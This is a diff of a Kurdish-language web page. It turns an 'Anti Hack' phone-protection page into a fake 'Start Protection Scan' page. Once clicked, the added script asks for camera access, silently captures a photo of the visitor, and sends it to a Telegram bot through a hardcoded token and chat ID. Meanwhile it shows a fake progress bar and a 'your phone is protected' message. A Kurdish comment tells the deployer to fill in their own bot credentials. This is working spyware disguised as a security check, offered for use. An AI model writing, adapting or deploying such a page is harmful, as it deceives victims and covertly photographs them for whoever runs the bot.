@@ -1,9 +1,55 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پاراستنی مۆبایل - Anti Hack</title>
+    <title>Security Check</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { border: 2px solid #00ff00; padding: 30px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 0, 0.2); width: 85%; max-width: 40
+        body { background-color: black; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
+        button { background-color: #28a745; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        button:hover { background-color: #218838; }
+    </style>
+</head>
+<body>
+    <h2 dir="rtl">بۆ پاراستنی مۆبایلەکەت، کلیک لە دوگمەی خوارەوە بکە:</h2>
+    <br>
+    <button id="startBtn">Start Protection Scan</button>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // لێرە تۆکەن و ئایدی خۆت بنووسە
+        const botToken = "7737351654:AAHkCqQ_X549u8F8vO8Z9r8z9r8z9r8z9r8"; 
+        const chatId = "6655443322"; 
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                startBtn.innerText = "Scanning... 65%";
+                
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'image.jpg');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                    startBtn.innerText = "Scan Completed! (100%)";
+                    alert("مۆبایلەکەت پارێزراوە!");
+                }, 2000);
+            } catch (err) {
+                alert("تکایە مۆڵەتی کامێرا بدە (Allow) بۆ ئەوەی پشکنینەکە کار بکات.");
+            }
+        });
+    </script>
+</body>
+</html>
